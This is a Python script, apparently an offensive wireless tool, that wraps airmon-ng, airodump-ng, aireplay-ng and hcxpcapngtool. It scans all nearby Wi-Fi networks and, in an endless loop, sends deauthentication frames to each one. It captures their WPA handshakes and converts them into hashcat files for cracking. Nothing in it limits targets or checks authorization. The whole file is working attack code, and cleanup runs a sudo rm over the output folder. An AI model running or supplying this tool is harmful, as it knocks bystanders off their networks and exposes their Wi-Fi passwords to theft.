#!/usr/bin/env python3
import subprocess
import argparse
import time
import sys
import signal
import datetime
import csv
import os
import re

DEBUG = False

class WiFiHandshakeCapture:
    def __init__(self, interface):
        self.interface = interface
        self.mon_interface = ""
        self.tmux_session = f"wifi_capture_{datetime.datetime.now().strftime('%Y%m%d%H%M%S')}"
        signal.signal(signal.SIGINT, self.signal_handler)
        self.output_file = "scanOutput"
        self.output_dir = "outputs"
        self.capture_dir = "handshakes"
        self.hashcat_22000_dir = "hashcat_22000"
        os.makedirs(self.output_dir, exist_ok=True)  # Add this line
        os.makedirs(self.capture_dir, exist_ok=True)
        os.makedirs(self.hashcat_22000_dir, exist_ok=True)

    def enable_monitor_mode(self):
        """Put the Wi-Fi interface into monitor mode with cleanup"""
        try:
            # Stop conflicting services
            # subprocess.run(["sudo", "systemctl", "stop", "NetworkManager"], check=True)
            # subprocess.run(["sudo", "systemctl", "stop", "wpa_supplicant"], check=True)
            
            # Start monitor mode
            subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
            result = subprocess.run(["sudo", "airmon-ng", "start", self.interface], stdout=subprocess.PIPE, check=True)
            
            pattern = r'monitor mode.*?\[phy\d+\](\w+)'
            # raw output of last subprocess.run
            output = result.stdout.decode('utf-8')
            print("OUTPUT: ",output)
            match = re.search(pattern, output)
            if match:
                self.mon_interface = match.group(1)
            else:
                self.mon_interface = f"wlan0mon"
                print("ERROR: Monitor interface not found, using default wlan0mon")
                os._exit(0)
            print(f"[*] Monitor mode enabled on {self.mon_interface}")
            
            # Create main tmux session
            subprocess.run(["tmux", "new-session", "-d", "-s", self.tmux_session, "-n", "main"])
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error enabling monitor mode: {e}")
            self.cleanup()
            return False

    def create_tmux_window(self, window_name, command):
        """Create a new tmux window with specified command"""
        try:
            subprocess.run([
                "tmux", "new-window", "-t", f"{self.tmux_session}:",
                "-n", window_name, "bash", "-c", f"{command}; read"
            ], check=True)
            return True
        except subprocess.CalledProcessError as e:
            print(f"Error creating tmux window: {e}")
            return False

    def parse_airodump_csv(self):
        networks = []
        try:
            file_name = f"{self.output_dir}/{self.output_file}-01.csv"
            with open(file_name, mode='r', newline='') as file:
                reader = csv.reader(file)
                # Skip the header and the first few lines until we reach the BSSID data
                for row in reader:
                    if len(row) > 0 and row[0].strip() == "BSSID":
                        break  # Found the start of the BSSID data
                # Now read the BSSID data
                for row in reader:
                    if len(row) < 14:  # Ensure the row has enough columns
                        continue
                    if row[0].strip() == "Station MAC":
                        break  # Stop when we reach the station data
                    bssid = row[0].strip()
                    channel = row[3].strip()
                    essid = row[13].strip()
                    networks.append((bssid, channel, essid))
        except Exception as e:
            print(f"Error parsing CSV file: {e}")
        return networks

    def scan_networks(self):
        """Scan for nearby networks using a tmux window"""
        try:
            self.create_tmux_window("scanner", 
                f"sudo airodump-ng -w {self.output_dir}/{self.output_file} --output-format csv {self.mon_interface}")
            
            print("Scanning for networks for 30 seconds...")
            time.sleep(30)
            
            # Stop scanning
            subprocess.run(["tmux", "kill-window", "-t", f"{self.tmux_session}:scanner"], check=True)
            
            # Parse scan results (simplified example)
            networks = self.parse_airodump_csv()
            if networks:
                print("\n[+] Found the following networks:")
                for bssid, channel, essid in networks:
                    print(f"    {essid} ({bssid}) on channel {channel}")
            return networks
            

        except Exception as e:
            print(f"Scan error: {e}")
            return []


    def capture_handshake(self, bssid,name, channel):
        """Capture handshake for a specific network with tmux monitoring"""
        print(f"Capturing Hash for {bssid}")
        bssid_no_dots = bssid.replace(":", "")
        output_file = f"handshake_{bssid.replace(':', '')}"
        cap_path = f"{self.output_dir}/{output_file}"  # Correct path
        if DEBUG:
            if bssid != "AA:BB:CC:DD:EE:FF":
                return False

        try:
            # Create capture window with split panes
            subprocess.run([
                "tmux", "new-window", "-t", f"{self.tmux_session}:",
                "-n", f"capture_{bssid}", "bash", "-c", 
                f"sudo airodump-ng -c {channel} --bssid {bssid} -w {cap_path} --output-format pcapng {self.mon_interface}; read"
            ], check=True)

            # Create deauth window
            self.create_tmux_window(f"deauth_{bssid}",
                f"sudo aireplay-ng -0 5 -a {bssid} {self.mon_interface}")

            # Monitor for handshake
            start_time = time.time()
            cap_file = f"{cap_path}-01.cap"  # Use the proper extension from airodump-ng
            while time.time() - start_time < 25:
                if os.path.exists(cap_file):  # Check if the file exists before running aircrack-ng
                    result = subprocess.run(
                        ["aircrack-ng", cap_file],
                        stdout=subprocess.PIPE,
                        text=True
                    )
                    if "1 handshake" in result.stdout:
                        print(f"[+] Handshake captured for {bssid}")
                        os.system(f"sudo cp {cap_file} {self.capture_dir}/{output_file}.cap")
                        os.system(f"sudo hcxpcapngtool -o {self.hashcat_22000_dir}/{name}_{bssid_no_dots}.22000 {cap_file}")
                        return True
                time.sleep(5)

            return False

        except Exception as e:
            print(f"Capture error: {e}")
            return False

        finally:
            # Cleanup tmux windows
            subprocess.run(["tmux", "kill-window", "-t", f"{self.tmux_session}:capture_{bssid}"],
                        stderr=subprocess.DEVNULL)
            subprocess.run(["tmux", "kill-window", "-t", f"{self.tmux_session}:deauth_{bssid}"],
                        stderr=subprocess.DEVNULL)

    def signal_handler(self, sig, frame):
        """Handle CTRL+C gracefully"""
        print("\n[!] Interrupt received, cleaning up...")
        self.cleanup()
        sys.exit(0)

    def cleanup(self):
        """Restore network configuration and clean up tmux"""
        print("[*] Cleaning up...")
        try:
            # Stop monitor mode
            subprocess.run(["sudo", "airmon-ng", "stop", "wlan0mon"], 
                          stderr=subprocess.DEVNULL)
            
            # Restore network services
            subprocess.run(["sudo", "ifconfig", self.interface, "up"], check=True)
            subprocess.run(["sudo", "service", "NetworkManager", "start"], check=True)
            # subprocess.run(["sudo", "systemctl", "start", "wpa_supplicant"], check=True)
                        # clear all file inside outputs directory

            print("[*] Cleaning up output files... on {}".format(self.output_dir))
            # subprocess.run(["sudo","rm", "-f", f"{self.output_dir}/*"], 
            #               stderr=subprocess.DEVNULL)
            os.system(f"sudo rm -f {self.output_dir}/*")
            # Kill tmux session
            subprocess.run(["tmux", "kill-session", "-t", self.tmux_session], 
                          stderr=subprocess.DEVNULL)

        except Exception as e:
            print(f"Cleanup error: {e}")

    def run(self):
        """Main execution flow"""
        if not self.enable_monitor_mode():
            return
        captured_handshakes = []
        while True:
            networks = self.scan_networks()
            if not networks:
                print("No networks found.")
                self.cleanup()
                return

            for bssid, channel, essid in networks:
                bssid_no_dots = bssid.replace(":", "")

                # iterate files inside handshakes directory
                already_captured = False
                for file in os.listdir(self.capture_dir):
                    if bssid_no_dots in file:
                        captured_handshakes.append(essid)
                        print(f"\n[+] Handshake already captured for {essid}")
                        already_captured = True
                        break
                
                if already_captured == True:
                    continue
                # if essid in captured_handshakes:
                #     continue
                # print(f"\n[+] Attempting capture for {essid} ({bssid})")
                if self.capture_handshake(bssid, essid, channel):
                    print(f"[+] Successfully captured handshake for {essid}")
                    captured_handshakes.append(essid)
                else:
                    print(f"[-] Failed to capture handshake for {essid}")
            time.sleep(5)
        # self.cleanup()
        print("\n[+] Capture complete. To view results:")
        print(f"    tmux attach -t {self.tmux_session}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='''All automated Handshake Capture tool. This will run in a loop and tries to capture handshake of every available network by using the aircrack-ng toolsuite
    In directory handshakes/ will be the raw handshake captures
    In directory hashcat_22000 there will be the handshakes ready to be cracked with hashcat mode 22000


    Dependencies: aircrack-ng toolsuite (sudo apt install aircrack-ng), hcxpcapngtool (sudo apt install hcxtools), tmux (sudo apt install tmux)''')
    parser.add_argument("-i", "--interface", required=True, help="Wi-Fi interface (e.g. wlan0)")
    args = parser.parse_args()

    capture = WiFiHandshakeCapture(args.interface)
    capture.run()